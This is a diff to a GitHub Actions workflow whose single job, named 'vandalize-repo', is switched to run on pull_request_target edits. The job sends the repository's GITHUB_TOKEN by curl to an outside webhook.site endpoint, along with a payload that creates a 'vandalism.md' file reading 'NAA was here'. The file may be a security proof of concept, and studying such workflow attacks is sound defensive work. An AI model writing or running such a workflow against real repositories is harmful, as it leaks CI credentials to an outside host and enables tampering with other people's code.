@@ -1,13 +1,15 @@
 run-name: "<img> "
 
-on: workflow_dispatch
+on:
+  pull_request_target:
+    types: edited
 
 jobs:
   vandalize-repo:
     runs-on: ubuntu-latest
     steps:
       - name: Vandalize
-        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X POST "https://webhook.site/cc752c07-de06-4a69-8d9c-48ddb5cb863b" --data ''{"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}'' '
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X POST "https://webhook.site/6b19afc4-a184-4e86-bddd-02f2b939bde4" --data ''{"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}'' '
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           REPO: ${{ github.repository }}
